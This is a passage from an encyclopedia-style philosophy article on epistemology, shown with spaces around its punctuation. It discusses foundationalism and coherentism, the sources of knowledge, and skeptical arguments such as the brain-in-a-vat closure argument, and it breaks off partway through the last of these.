Experiential foundationalism is not restrictive in the same way .
Suppose instead of ( B ) , you believe
( H) That hat is blue .
Unlike ( B ) , ( H ) is about the hat itself , and not the way the hat appears to you .
Such a belief is not one about which we are infallible or otherwise epistemically privileged .
Privilege foundationalism would , therefore , classify ( H ) as nonbasic .
It is , however , quite plausible to think that ( E ) justifies not only ( B ) but ( H ) as well .
If ( E ) is indeed what justifies ( H ) , and ( H ) does not receive any additional justification from any further beliefs of yours , then ( H ) qualifies , according to DB , as basic .
Experiential Foundationalism , then , combines two crucial ideas : ( i ) when a justified belief is basic , its justification is not owed to any other belief ; ( ii ) what in fact justifies basic beliefs are experiences .
Under ordinary circumstances , perceptual beliefs such as ( H ) are not based on any further beliefs about one ’s own perceptual experiences .
It is not clear , therefore , how privilege foundationalism can account for the justification of ordinary perceptual beliefs like ( H ) . [ 41 ]
Experiential foundationalism , on the other hand , has no trouble at all explaining how ordinary perceptual beliefs are justified : they are justified by the perceptual experiences that give rise to them .
This could be viewed as a reason for preferring experiential foundationalism to privilege foundationalism .
DB articulates one conception of basicality .
Here ’s an alternative conception :
Epistemic Basicality ( EB )
S ’s justified belief that p is basic if and only if S ’s justification for believing that p does not depend on any justification S possesses for believing a further proposition , q . [ 42 ]
EB makes it more difficult for a belief to be basic than DB does .
To see why , we turn to the chief question ( let ’s call it the “ J - question ” ) that advocates of experiential foundationalism face :
The J - Question
Why are perceptual experiences a source of justification ?
One way of answering the J- question is as follows : perceptual experiences are a source of justification only when , and only because , we have justification for taking them to be reliable . [ 43 ]
Note that your having justification for believing that p does n’t entail that you actually believe p .
Thus , your having justification for attributing reliability to your perceptual experiences does n’t entail that you actually believe them to be reliable .
What might give us justification for thinking that our perceptual experiences are reliable ?
That ’s a complicated issue .
For our present purposes , let ’s consider the following answer :
We remember that they have served us well in the past .
We are supposing , then , that justification for attributing reliability to your perceptual experiences consists of memories of perceptual success .
On this view , a perceptual experience ( E ) justifies a perceptual belief only when , and only because , you have suitable track - record memories that give you justification for considering ( E ) reliable .
( Of course , this raises the question why those memories give us justification , but there are many different approaches to this question , as we ’ll see more fully below . )
If this view is correct , then it is clear how DB and EB differ .
Your having justification for ( H ) depends on your having justification for believing something else in addition to ( H ) , namely that your visual experiences are reliable .
As a result ( H ) is not basic in the sense defined by EB .
However , ( H ) might still be basic in the sense defined by DB .
If you are justified in believing ( H ) and your justification is owed solely to ( E ) and ( M ) , neither of which includes any beliefs , then your belief is doxastically — though not epistemically — basic .
We ’ve considered one possible answer to the J- question , and considered how EB and DB differ if that answer is correct .
But there are other possible answers to the J-question .
Another answer is that perceptual experiences are a source of justification when , and because , they are of types that reliably produce true beliefs . [ 44 ]
Another answer is that perceptual experiences are a source of justification when , and because , they are of types that reliably indicate the truth of their content .
Yet another answer is that perceptual experiences are a source of justification when , and because , they have a certain phenomenology : that of presenting their content as true . [ 45 ]
To conclude this section , let us briefly consider how justification is supposed to be transferred from basic to nonbasic beliefs .
There are two options : the justificatory relation between basic and nonbasic beliefs could be deductive or non-deductive .
If we take the relation to be deductive , each of one ’s nonbasic beliefs would have to be such that it can be deduced from one ’s basic beliefs .
But if we consider a random selection of typical beliefs we hold , it is not easy to see from which basic beliefs they could be deduced .
Foundationalists , therefore , typically conceive of the link between the foundation and the superstructure in non-deductive terms .
They would say that , for a given set of basic beliefs , B , to justify a nonbasic belief , B* , it is n’t necessary that B entails B*.
Rather , it is sufficient that , the inference from B to B * is a rational one — however such rationality is to be understood . [ 46 ]
4.2 Coherentism
Foundationalism says that knowledge and justification are structured like a building , consisting of a superstructure that rests upon a foundation .
According to coherentism , this metaphor gets things wrong .
Knowledge and justification are structured like a web where the strength of any given area depends on the strength of the surrounding areas .
Coherentists , then , deny that there are any basic beliefs .
As we saw in the previous section , there are two different ways of conceiving of basicality .
Consequently , there are two corresponding ways of construing coherentism : as the denial of doxastic basicality or as the denial of epistemic basicality .
Consider first coherentism as the denial of doxastic basicality :
Doxastic Coherentism
Every justified belief receives its justification from other beliefs in its epistemic neighborhood .
Let us apply this thought to the hat example we considered in Section 3.1 .
Suppose again you notice someone ’s hat and believe
( H) That hat is blue .
Let ’s agree that ( H ) is justified .
According to coherentism , ( H ) receives its justification from other beliefs in the epistemic vicinity of ( H ) .
They constitute your evidence or your reasons for taking ( H ) to be true .
Which beliefs might make up this set of justification - conferring neighborhood beliefs ?
We will consider two approaches to answering this question .
The first is known as inference to the best explanation .
Such inferences generate what is called explanatory coherence ( see chapter 7 in Harman 1986 ) .
According to this approach , we must suppose you form a belief about the way the hat appears to you in your perceptual experiences , and a second belief to the effect that your perceptual experience , the hat ’s looking blue to you , is best explained by the hypothesis that ( H ) is true .
So the relevant set of beliefs is the following :
(1) I am having a visual experience ( E ) : the hat looks blue to me .
(2) My having ( E ) is best explained by assuming that ( H ) is true .
There are of course alternative explanations of why you have ( E ) .
Perhaps you are hallucinating that the hat is blue .
Perhaps an evil demon makes the hat look blue to you when in fact it is red .
Perhaps you are the sort of person to whom hats always look blue .
An explanatory coherentist would say that , compared with these , the hat ’s actual blueness is a superior explanation .
That ’s why you are justified in believing ( H ) .
Note that an explanatory coherentist can also explain the lack of justification .
Suppose you remember that you just took a hallucinatory drug that makes things look blue to you .
That would prevent you from being justified in believing ( H ) .
The explanatory coherentist can account for this by pointing out that , in the case we are considering now , the truth of ( H ) would not be the best explanation of why you are having experience ( E ) .
Rather , your having taken the hallucinatory drug would explain your having ( E ) at least as well as the hypothesis ( H ) would explain it .
That ’s why , according to the explanatory coherentist , in this variation of our original case you are not justified in believing ( H ) .
One challenge for explanatory coherentists is to explain what makes one explanation better than another .
Let ’s use the evil demon hypothesis to illustrate this challenge .
What we need is an explanation of why you are having ( E ) .
According to the evil demon hypothesis , you are having ( E ) because the evil demon is causing you to have ( E ) , in order to trick you .
The explanatory coherentist would say that , if the bulk of our beliefs about the mind - independent world are justified , then this “ evil demon ” hypothesis is a bad explanation of why you are having ( E ) .
But why is it bad ?
What we need to answer this question is a general and principled account of what makes one explanation better than another .
Suppose we appeal to the fact that you are not justified in believing in the existence of evil demons .
The general idea would be this :
If there are two competing explanations , E1 and E2 , and E1 consists of or includes a proposition that you are not justified in believing whereas E2 does not , then E2 is better than E1 .
The problem with this idea is that it puts the cart before the horse .
Explanatory coherentism is supposed to help us understand what it is for beliefs to be justified .
It does n’t do that if it accounts for the difference between better and worse explanations by making use of the difference between justified and unjustified belief .
If explanatory coherentism were to proceed in this way , it would be a circular , and thus uninformative , account of justification .
So the challenge that explanatory coherentism must meet is to give an account , without using the concept of justification , of what makes one explanation better than another .
Let us move on to the second way in which the coherentist approach might be carried out .
Recall what a subject ’s justification for believing p is all about : possessing a link between the belief that p and p’s truth .
Suppose the subject knows that the origin of her belief that p is reliable .
So she knows that beliefs coming from this source tend to be true .
Such knowledge would give her an excellent link between the belief and its truth .
So we might say that the neighborhood beliefs which confer justification on ( H ) are the following :
(1) I am having a visual experience ( E ) : the hat looks blue to me .
(3) Experiences like ( E ) are reliable .
Call coherentism of this kind reliability coherentism .
If you believe ( 1 ) and ( 3 ) , you are in possession of a good reason for thinking that the hat is indeed blue .
So you are in possession of a good reason for thinking that the belief in question , ( H ) , is true .
That ’s why , according to reliability coherentism , you are justified in believing ( H ) .
Like explanatory coherentism , this view faces a circularity problem .
If ( H ) receives its justification in part because you also believe ( 3 ) , ( 3 ) itself must be justified .
But where would your justification for ( 3 ) come from ?
One answer would be : from your memory of perceptual success in the past .
You remember that your visual experiences have had a good track record .
They have rarely led you astray .
The problem is that you ca n’t justifiably attribute a good track record to your perceptual faculties without using your perceptual faculties .
So if reliability coherentism is going to work , it would have to be legitimate to use a faculty for the very purpose of establishing the reliability of that faculty itself .
But it is not clear that this is legitimate . [ 47 ]
We have seen that explanatory coherentism and reliability coherentism each face its own distinctive circularity problem .
Since both are versions of doxastic coherentism , they both face a further difficulty :
Do people , under normal circumstances , really form beliefs like ( 1 ) , ( 2 ) , and ( 3 ) ?
It would seem they do not .
It could be objected , therefore , that these two versions of coherentism make excessive intellectual demands of ordinary subjects who are unlikely to have the background beliefs that , according to these versions of coherentism , are needed for justification .
This objection could be avoided by stripping coherentism of its doxastic element .
The result would be the following version of coherentism , which results from rejecting EB ( the epistemic conception of basicality ) :
Dependence Coherentism
Whenever one is justified in believing a proposition p 1 , one ’s justification for believing p 1 depends on justification one has for believing some further propositions , p 1 , p 2 , … p n .
An explanatory coherentist might say that , for you to be justified in believing ( H ) , it ’s not necessary that you actually believe ( 1 ) and ( 2 ) .
However , it is necessary that you have justification for believing ( 1 ) and ( 2 ) .
It is your having justification for ( 1 ) and ( 2 ) that gives you justification for believing ( H ) .
A reliability coherentist might make an analogous point .
She might say that , to be justified in believing ( H ) , you need not believe anything about the reliability of your belief ’s origin .
You must , however , have justification for believing that your belief ’s origin is reliable ; that is , you must have justification for ( 1 ) and ( 3 ) .
Both versions of dependence coherentism , then , rest on the supposition that it is possible to have justification for a proposition without actually believing that proposition .
Dependence coherentism is a significant departure from the way coherentism has typically been construed by its advocates .
According to the typical construal of coherentism , a belief is justified , only if the subject has certain further beliefs that constitute reasons for the given belief .
Dependence coherentism rejects this .
According to it , justification need not come in the form of beliefs .
It can come in the form of introspective and memorial experience , so long as such experience gives a subject justification for beliefs about either reliability or explanatory coherence .
In fact , dependence coherentism allows for the possibility that a belief is justified , not by receiving any of its justification from other beliefs , but solely by suitable perceptual experiences and memory experience . [ 48 ]
Next , let us examine some of the reasons provided in the debate over foundationalism and coherentism .
4.3 Why Foundationalism ?
The main argument for foundationalism is called the regress argument .
It ’s an argument from elimination .
With regard to every justified belief , B 1 , the question arises of where B 1 ’s justification comes from .
If B 1 is not basic , it would have to come from another belief , B 2 .
But B 2 can justify B 1 only if B 2 is justified itself .
If B 2 is basic , the justificatory chain would end with B 2 .
But if B 2 is not basic , we need a further belief , B 3 .
If B 3 is not basic , we need a fourth belief , and so forth .
Unless the ensuing regress terminates in a basic belief , we get two possibilities : the regress will either loop back to B 1 or continue ad infinitum .
According to the regress argument , both of these possibilities are unacceptable .
Therefore , if there are justified beliefs , there must be basic beliefs . [ 49 ]
This argument suffers from various weaknesses .
First , we may wonder whether the alternatives to foundationalism are really unacceptable .
In the recent literature on this subject , we actually find an elaborate defense of the position that infinitism is the correct solution to the regress problem . [ 50 ]
Nor should circularity be dismissed too quickly .
The issue is not whether a simple argument of the form p therefore p can justify the belief that p.
Of course it cannot .
Rather , the issue is ultimately whether , in the attempt to show that trust in our faculties is reasonable , we may make use of the input our faculties deliver .
Whether such circularity is as unacceptable as a p- therefore - p inference is an open question .
Moreover , the avoidance of circularity does not come cheap .
Experiential foundationalists claim that perception is a source of justification .
Hence they need to answer the J-question :
Why is perception a source of justification ?
As we saw above , if we wish to answer this question without committing ourselves to the kind of circularity dependence coherentism involves , we must choose between externalism and an appeal to brute necessity .
The second weakness of the regress argument is that its conclusion merely says this :
If there are justified beliefs , there must be justified beliefs that do not receive their justification from other beliefs .
Its conclusion does not say that , if there are justified beliefs , there must be beliefs whose justification is independent of any justification for further beliefs .
So the regress argument , if it were sound , would merely show that there must be doxastic basicality .
Dependence coherentism , however , allows for doxastic basicality .
So the regress argument merely defends experiential foundationalism against doxastic coherentism .
It does not tell us why we should prefer experiential foundationalism to dependence coherentism .
Experiential foundationalism can be supported by citing cases like the blue hat example .
Such examples make it plausible to assume that perceptual experiences are a source of justification .
But they do not arbitrate between dependence coherentism and experiential foundationalism , since both of those views appeal to perceptual experiences to explain why perceptual beliefs are justified .
Finally , foundationalism can be supported by advancing objections to coherentism .
One prominent objection is that coherentism somehow fails to ensure that a justified belief system is in contact with reality .
This objection derives its force from the fact that fiction can be perfectly coherent .
Why think , therefore , that a belief system ’s coherence is a reason for thinking that the beliefs in that system tend to be true ?
Coherentists could respond to this objection by saying that , if a belief system contains beliefs such as “ Many of my beliefs have their origin in perceptual experiences ” and “ My perceptual experiences are reliable ” , it is reasonable for the subject to think that her belief system brings her into contact with external reality .
This looks like an effective response to the no-contact - with - reality objection .
Moreover , it is not easy to see why foundationalism itself should be better positioned than coherentism when contact with reality is the issue .
What is meant by “ ensuring ” contact with reality ?
If foundationalists expect a logical guarantee of such contact , basic beliefs must be infallible .
That would make contact with reality a rather expensive commodity .
Given its price , foundationalists might want to lower their expectations .
According to an alternative construal , we expect merely the likelihood of contact with reality .
But if coherentists account for the epistemic value of perception in any way , then they can meet that expectation as well as foundationalists can .
Since coherentism can be construed in different ways , it is unlikely that there is one single objection that succeeds in refuting all possible versions of coherentism .
Doxastic coherentism , however , seems particularly vulnerable to criticism coming from the foundationalist camp .
One of these we considered already :
It would seem that doxastic coherentism makes excessive intellectual demands on believers .
When dealing with the mundane tasks of everyday life , we do n’t normally bother to form beliefs about the explanatory coherence of our beliefs or the reliability of our belief sources .
According to a second objection , doxastic coherentism fails by being insensitive to the epistemic relevance of perceptual experiences .
Foundationalists could argue as follows .
Suppose Kim is observing a chameleon that rapidly changes its colors .
A moment ago it was blue , now it ’s purple .
Kim still believes it ’s blue .
Her belief is now unjustified because she believes the chameleon is blue even though it looks purple to her .
Then the chameleon changes its color back to blue .
Now Kim ’s belief that the chameleon is blue is justified again because the chameleon once again looks blue to her .
The point would be that what ’s responsible for the changing justificatory status of Kim ’s belief is solely the way the chameleon looks to her .
Since doxastic coherentism does not attribute epistemic relevance to perceptual experiences by themselves , it cannot explain why Kim ’s belief is first justified , then unjustified , and eventually justified again . [ 51 ]
4.4 Why Coherentism ?
Coherentism is typically defended by attacking foundationalism as a viable alternative .
To argue against privilege foundationalism , coherentists pick an epistemic privilege they think is essential to foundationalism , and then argue that either no beliefs , or too few beliefs , enjoy such a privilege .
Against experiential foundationalism , different objections have been advanced .
One line of criticism is that perceptual experiences do n’t have propositional content .
Therefore , the relation between a perceptual belief and the perceptual experience that gives rise to it can only be causal .
But it is not clear that this is correct .
When you see the hat and it looks blue to you , does n’t your visual experience — its looking blue to you — have the propositional content that the hat is blue ?
If it does , then why not allow that your perceptual experience can play a justificatory role ? [ 52 ]
Another line of thought is that , if perceptual experiences have propositional content , they cannot stop the justificatory regress because they would then be in need of justification themselves .
That , however , is a strange thought .
In our actual epistemic practice , we never demand of others to justify the way things appear to them in their perceptual experiences .
Indeed , such a demand would seem absurd .
Suppose I ask you : “ Why do you think that the hat is blue ? ”
You answer : “ Because it looks blue to me ” .
There are sensible further questions I might ask at that point .
For instance , I might ask : “ Why do you think its looking blue to you gives you a reason for believing it is blue ? ”
Or I might ask : “ Could n’t you be mistaken in believing it looks blue to you ? ”
But now suppose I ask you : “ Why do you suppose the perceptual experience in which the hat looks blue to you is justified ? ”
In response to that question , you should accuse me of misusing the word “ justification ” .
I might as well ask you what it is that justifies your headache when you have one , or what justifies the itch in your nose when you have one .
The latter questions , you should reply , would be as absurd as my request for stating a justifying reason for your perceptual experience . [ 53 ]
Experiential foundationalism , then , is not easily dislodged .
On what grounds could coherentists object to it ?
To raise problems for experiential foundationalism , coherentists could press the J-question :
Why are perceptual experiences a source of justification ?
If foundationalists answer the J- question appealing to evidence that warrants the attribution of reliability to perceptual experiences , experiential foundationalism morphs into dependence coherentism .
To avoid this outcome , foundationalists would have to give an alternative answer .
One way of doing this would be to adopt the epistemic conception of basicality , and view it as a matter of brute necessity that perception is a source of justification .
It remains to be seen whether such a view is sustainable .
5. Sources of Knowledge and Justification
Beliefs arise in people for a wide variety of causes .
Among them , we must list psychological factors such as desires , emotional needs , prejudice , and biases of various kinds .
Obviously , when beliefs originate in sources like these , they do n’t qualify as knowledge even if true .
For true beliefs to count as knowledge , it is necessary that they originate in sources we have good reason to consider reliable .
These are perception , introspection , memory , reason , and testimony .
Let us briefly consider each of these .
5.1 Perception
Our perceptual faculties include at least our five senses : sight , touch , hearing , smelling , and tasting .
We must distinguish between an experience that can be classified as perceiving that p ( for example , seeing that there is coffee in the cup and tasting that it is sweet ) , which entails that p is true , and a perceptual experience in which it seems to us as though p , but where p might be false .
Let us refer to this latter kind of experience as perceptual seemings .
The reason for making this distinction lies in the fact that perceptual experience is fallible .
The world is not always as it appears to us in our perceptual experiences .
We need , therefore , a way of referring to perceptual experiences in which p seems to be the case that allows for the possibility of p being false .
That ’s the role assigned to perceptual seemings .
So some perceptual seemings that p are cases of perceiving that p , others are not .
When it looks to you as though there is a cup of coffee on the table and in fact there is , the two states coincide .
If , however , you hallucinate that there is a cup on the table , you have a perceptual seeming that p without perceiving that p .
One family of epistemological issues about perception arises when we concern ourselves with the psychological nature of the perceptual processes through which we acquire knowledge of external objects .
According to direct realism , we can acquire such knowledge because we can directly perceive such objects .
For example , when you see a tomato on the table , what you perceive is the tomato itself .
According to indirect realism , we acquire knowledge of external objects by virtue of perceiving something else , namely appearances or sense - data .
An indirect realist would say that , when you see and thus know that there is a tomato on the table , what you really see is not the tomato itself but a tomato - like sense - datum or some such entity .
Direct and indirect realists hold different views about the structure of perceptual knowledge .
Indirect realists would say that we acquire perceptual knowledge of external objects by virtue of perceiving sense data that represent external objects .
Sense data enjoy a special status : we know directly what they are like .
So indirect realists think that , when perceptual knowledge is foundational , it is knowledge of sense data and other mental states .
Knowledge of external objects is indirect : derived from our knowledge of sense data .
The basic idea is that we have indirect knowledge of the external world because we can have foundational knowledge of our own mind .
Direct realists , in contrast , say that perceptual experiences can give you direct , foundational knowledge of external objects . [ 54 ]
We take our perceptual faculties to be reliable .
But how can we know that they are reliable ?
For externalists , this might not be much of a challenge .
If the use of reliable faculties is sufficient for knowledge , and if by using reliable faculties we acquire the belief that our faculties are reliable , then we come to know that our faculties are reliable .
But even externalists might wonder how they can , via argument , show that our perceptual faculties are reliable .
The problem is this .
It would seem the only way of acquiring knowledge about the reliability of our perceptual faculties is through memory , through remembering whether they served us well in the past .
But should I trust my memory , and should I think that the episodes of perceptual success that I seem to recall were in fact episodes of perceptual success ?
If I am entitled to answer these questions with “ yes ” , then I need to have , to begin with , reason to view my memory and my perceptual experiences as reliable .
It would seem , therefore , that there is no non-circular way of arguing for the reliability of one ’s perceptual faculties . [ 55 ]
5.2 Introspection
Introspection is the capacity to inspect the present contents of one ’s own mind .
Through introspection , one knows what mental states one is currently in : whether one is thirsty , tired , excited , or depressed .
Compared with perception , introspection appears to have a special status .
It is easy to see how a perceptual seeming can go wrong : what looks like a cup of coffee on the table might be just be a clever hologram that ’s visually indistinguishable from an actual cup of coffee .
But can it introspectively seem to me that I have a headache when in fact I do not ?
It is not easy to see how it could be .
Thus introspection is widely thought to enjoy a special kind of immunity to error .
But what does this amount to ?
First , it could be argued that , when it comes to introspection , there is no difference between appearance and reality ; therefore , introspective seemings infallibly constitute their own success .
Alternatively , one could view introspection as a source of certainty .
Here the idea is that an introspective experience of p eliminates any possible reason for doubt as to whether p is true .
Finally , one could attempt to explain the specialness of introspection by examining the way we respond to first - person reports : typically , we attribute a special authority to such reports .
According to this approach , introspection is incorrigible : its deliverances cannot be corrected by any other source .
However we construe the special kind of immunity to error that introspection enjoys , such immunity is not enjoyed by perception .
Some foundationalists have therefore thought that the foundations of our empirical knowledge can be furnished by introspection of our own perceptual experiences , rather than perception of mind - independent things around us .
Is it really true , however , that , compared with perception , introspection is in some way special ?
Critics of foundationalism have argued that introspection is not infallible .
Might one not confuse an unpleasant itch for a pain ?
Might I not think that the shape before me appears circular to me when in fact it appears slightly elliptical to me ?
If it is indeed possible for introspection to mislead , then it is not clear in what sense introspection can constitute its own success , provide certainty , or even incorrigibility .
Yet it also is n’t easy to see either how , if one clearly and distinctly feels a throbbing headache , one could be mistaken about that .
Introspection , then , turns out to be a mysterious faculty .
On the one hand , it does not seem to be an infallible faculty ; on the other hand , it is not easy to see how error is possible in many specific cases of introspection . [ 56 ]
The definition of introspection as the capacity to know the present contents of one ’s own mind leaves open the question of how similar the different exercises of this capacity may be from one another .
According to some epistemologists , when we exercise this capacity with respect to our sensations , we are doing something very different from what we do when we exercise this capacity with respect to our own conscious beliefs , intentions , or other rationally evaluable states of mind : our exercises of this capacity with respect to our own conscious , rationally evaluable states of mind is , they claim , partly constitutive of our being in those very states .
In support of this claim , they point out that we sometimes address questions of the form “ do you believe that p ? ” by considering whether it is true that p , and reporting our belief concerning p not by inspecting our mind , but rather by making up our mind ( see Moran 2001 and Boyle 2009 for defenses of this view ; see Gertler 2011 for objections to the view ) .
5.3 Memory
Memory is the capacity to retain knowledge acquired in the past .
What one remembers , though , need not be a past event .
It may be a present fact , such as one ’s telephone number , or a future event , such as the date of the next elections .
Memory is , of course , fallible .
Not every experience as of remembering that p is an instance of correctly remembering that p .
We should distinguish , therefore , between remembering that p ( which entails the truth of p ) and seeming to remember that p ( which does not entail the truth of p ) .
What makes memorial seemings a source of justification ?
Is it a necessary truth that , if one has a memorial seeming that p , one has thereby prima facie justification for p ?
Or is memory a source of justification only if , as coherentists might say , one has reason to think that one ’s memory is reliable ?
Or is memory a source of justification only if , as externalists would say , it is in fact reliable ?
Also , how can we respond to skepticism about knowledge of the past ?
Memorial seemings of the past do not guarantee that the past is what we take it to be .
We think that we are older than five minutes , but it is logically possible that the world sprang into existence just five minutes ago , complete with our dispositions to have memorial seemings of a more distant past and items such as apparent fossils that suggest a past going back millions of years .
Our seeming to remember that the world is older than a mere five minutes does not entail , therefore , that it really is .
Why , then , should we think that memory is a source of knowledge about the past ? [ 57 ]
5.4 Reason
Some beliefs are ( thought to be ) justified independently of experience .
Justification of that kind is said to be a priori .
A standard way of defining a priori justification is as follows :
A Priori Justification
S is justified a priori in believing that p if and only if S ’s justification for believing that p does not depend on any experience .
When they are knowledgeably held , beliefs justified in this way are instances of a priori knowledge . [ 58 ]
What exactly counts as experience ?
If by “ experience ” we mean just perceptual experiences , justification deriving from introspective or memorial experiences would count as a priori .
For example , I could then know a priori that I ’m thirsty , or what I ate for breakfast this morning .
While the term “ a priori ” is sometimes used in this way , the strict use of the term restricts a priori justification to justification derived solely from the use of reason .
According to this usage , the word “ experiences ” in the definition above includes perceptual , introspective , and memorial experiences alike .
On this narrower understanding , paragons of what I can know a priori are conceptual truths ( such as “ All bachelors are unmarried ” ) , and truths of mathematics , geometry and logic .
Justification and knowledge that is not a priori is called “ a posteriori ” or “ empirical ” .
For example , in the narrow sense of “ a priori ” , whether I ’m thirsty or not is something I know empirically ( on the basis of introspective experiences ) , whereas I know a priori that 12 divided by 3 is 4 .
Several important issues arise about a priori knowledge .
First , does it exist at all ?
Skeptics about apriority deny its existence .
They do n’t mean to say that we have no knowledge of mathematics , geometry , logic , and conceptual truths .
Rather , what they claim is that all such knowledge is empirical . [ 59 ]
Second , if a priori justification is possible , exactly what does it involve ?
What makes a belief such as “ All bachelors are unmarried ” justified ?
Is it an unmediated grasp of the truth of this proposition ?
Or does it consist of grasping that the proposition is necessarily true ?
Or is it the purely intellectual state of “ seeing ” ( with the “ eye of reason ” ) or “ intuiting ” that this proposition is true ( or necessarily true ) ?
( see Bengson 2015 and Chudnoff 2013 for sophisticated defenses of this view ) .
Or is it , as externalists would suggest , the reliability of the cognitive process by which we come to recognize the truth of such a proposition ?
Third , if a priori knowledge exists , what is its extent ?
Empiricists have argued that a priori knowledge is limited to the realm of the analytic , consisting of propositions true solely by virtue of our concepts , and so do not convey any information about the world .
Propositions that convey genuine information about world are called synthetic .
a priori knowledge of synthetic propositions , empiricists would say , is not possible .
Rationalists deny this .
They might appeal to a proposition such as “ If a ball is green all over , then it does n’t have black spots ” as an example of a proposition that is both synthetic and yet knowable a priori ( see Ichikawa and Jarvis 2009 and Malmgren 2011 for a discussion of the content of such a priori justified judgments ; for literature on a priori knowledge , see BonJour 1998 , BonJour in BonJour & Devitt 2005 [ 2013 ] ; Boghossian and Peacocke 2000 ; Casullo 2003 ; Jenkins 2008 , 2014 ; and Devitt 2014 ) .
5.5 Testimony
Testimony differs from the sources we considered above because it is n’t distinguished by having its own cognitive faculty .
Rather , to acquire knowledge of p through testimony is to come to know that p on the basis of someone ’s saying that p. “ Saying that p ” must be understood broadly , as including ordinary utterances in daily life , postings by bloggers on their blogs , articles by journalists , delivery of information on television , radio , tapes , books , and other media .
So , when you ask the person next to you what time it is , and she tells you , and you thereby come to know what time it is , that ’s an example of coming to know something on the basis of testimony .
And when you learn by reading the Washington Post that the terrorist attack in Sharm el - Sheikh of 22 July 2005 killed at least 88 people , that , too , is an example of acquiring knowledge on the basis of testimony .
The epistemological puzzle testimony raises is this :
Why is testimony a source of knowledge ?
An externalist might say that testimony is a source of knowledge if , and because , it comes from a reliable source .
But here , even more so than in the case of our faculties , internalists will not find that answer satisfactory .
Suppose you hear someone saying “ p ” .
Suppose further that person is in fact utterly reliable with regard to the question of whether p is the case or not .
Finally , suppose you have no clue whatever as to that person ’s reliability .
Would n’t it be plausible to conclude that , since that person ’s reliability is unknown to you , that person ’s saying “ p ” does not put you in a position to know that p ?
But if the reliability of a testimonial source is not sufficient for making it a source of knowledge , what else is needed ?
Thomas Reid suggested that , by our very nature , we accept testimonial sources as reliable and tend to attribute credibility to them unless we encounter special contrary reasons .
But that ’s merely a statement of the attitude we in fact take toward testimony .
What is it that makes that attitude reasonable ?
It could be argued that , in one ’s own personal experiences with testimonial sources , one has accumulated a long track record that can be taken as a sign of reliability .
However , when we think of the sheer breadth of the knowledge we derive from testimony , one wonders whether one ’s personal experiences constitute an evidence base rich enough to justify the attribution of reliability to the totality of the testimonial sources one tends to trust ( see E. Fricker 1994 and M. Fricker 2007 for more on this issue ) .
An alternative to the track record approach would be to declare it a necessary truth that trust in testimonial sources is at least prima facie justified .
While this view has been prominently defended , it requires an explanation of what makes such trust necessarily prima facie justified .
Such explanations have proven to be controversial . [ 60 ]
6 . The Limits of Cognitive Success
6.1 General Skepticism and Selective Skepticism
Much of modern epistemology aims to address one or another kind of skepticism .
Skepticism is a challenge to our pre-philosophical conception of ourselves as cognitively successful beings .
Such challenges come in many varieties .
One way in which these varieties differ concerns the different kinds of cognitive success that they target : skepticism can challenge our claims to know , or our claims to believe justifiably , or our claims to have justification for believing , or our claims to have any good reasons for belief whatsoever .
But another way in which these varieties differ is in whether the skepticism in question is fully general — targeting the possibility of enjoying any instance of the relevant cognitive success — or is selective — targeting the possibility of enjoying the relevant cognitive success concerning a particular subject matter ( e.g. , the past , the minds of others , the world beyond our own consciousness ) or concerning beliefs formed by a particular method ( e.g. , perception , memory , reasoning , etc. ) .
General skepticism and selective skepticism pose very different sorts of challenges , and use very different kinds of arguments .
General skepticism is motivated by reasoning from some apparently conflicting features of the kind of cognitive success in question .
For instance , a general skeptic might claim that justification requires a regress of justifiers , but then argue that this regress of justifiers cannot be contained in any finite mind — and thus , the skeptic might conclude , no finite being can be justified in believing anything .
Alternatively a general skeptic might claim that knowledge requires certainty , and that nobody can be certain of something unless there is nothing of which she could be even more certain — thus , the skeptic might conclude , we can know virtually nothing ( see Unger 1975 ) .
Selective skepticism , in contrast , is typically motivated by appeal to one or another skeptical hypothesis .
A skeptical hypothesis is a hypothesis according to which the facts that you claim to know ( whether these facts concern the past , or the mind of others , or the mind - independent world , or what have you ) may , for all you can tell , be radically different from how they appear to you to be .
Thus , a skeptical hypothesis is a hypothesis that distinguishes between the way things appear to you , on the one hand , and the way they really are , on the other ; and this distinction is deployed in such a way as to pose a challenge to your cognitive success concerning the latter .
Here are some famous examples of skeptical hypotheses :
All the other humans around me are automata who simply act exactly as if they have thoughts and feelings .
The whole universe was created no more than 5 minutes ago , replete with fake memories and other misleading evidence concerning a distant past .
I ’m lying in my bed dreaming everything that I ’m aware of right now .
I ’m a mere brain - in - a - vat ( a BIV , for short ) being electrochemically stimulated to have all these states of mind that I ’m now having .
Skeptics can make use of such hypotheses in constructing various arguments that challenge our pre-philosophical picture of ourselves as cognitively successful .
Consider , for instance , the BIV hypothesis , and some ways in which this hypothesis can be employed in a skeptical argument .
Here is one way of doing so .
According to the BIV hypothesis , the experiences you would have as a BIV and the experiences you have as a normal person are perfectly alike , indistinguishable , so to speak , “ from the inside ” .
Thus , although it appears to you as if you are a normally embodied human being , everything would appear exactly the same way to a BIV .
Thus , the way things appear to you cannot provide you with knowledge that you are not a BIV .
But if the way things appear to you cannot provide you with such knowledge , then nothing can give you such knowledge , and so you cannot know that you ’re not a BIV .
Of course , you already know this much : if you are a BIV , then you do n’t have any hands .
If you do n’t know that you ’re not a BIV , then you do n’t know that you ’re not in a situation in which you do n’t have any hands .
But if you do n’t know that you ’re not in a situation in which you do n’t have any hands , then you do n’t know that you ’re not handless .
And to not know that you ’re not handless is simply to not know that you have hands .
We can summarize this skeptical argument as follows :
The BIV - Knowledge Closure Argument ( BKCA ) ( C1 ) I do n’t know that I ’m not a BIV .
( C2 ) If I do n’t know that I ’m not a BIV , then I do n’t know that I have hands .
Therefore : ( C3 ) I do n’t know that I have hands .
As we have just seen , ( C1 ) and ( C2 ) are very plausible premises .
It would seem , therefore , that BKCA is sound .
If it is , we must conclude we do n’t know we have hands .
But surely that conclusion ca n’t be right : if it turns out that I do n’t know that I have hands , that must be because of something very peculiar about my cognitive relation to the issue of whether I have hands — not because of the completely anodyne considerations mentioned in BKCA .
So we are confronted with a difficult challenge :
The conclusion of the BKCA seems plainly false , but on what grounds can we reject it ? [ 61 ]
Here are some other ways of using the BIV hypothesis to generate a skeptical argument .
The BIV - Justification Underdetermination Argument ( BJUA ) ( U1 )
The way things appear to me could be equally well explained by the BIV hypothesis as by my ordinary beliefs that things appear to me the way they do because I perceive mind - independent objects .
( U2 ) If the way things appear to me could be equally well explained by either of two hypotheses , then I am not justified in believing one of those hypotheses rather than the other .
Therefore : ( U3 ) I am not justified in believing that I perceive mind - independent objects .
The BIV - Knowledge Defeasibility Argument ( BKDA ) ( D1 ) If I know that I have hands , then I know that any evidence indicating that I do n’t have hands is misleading evidence .
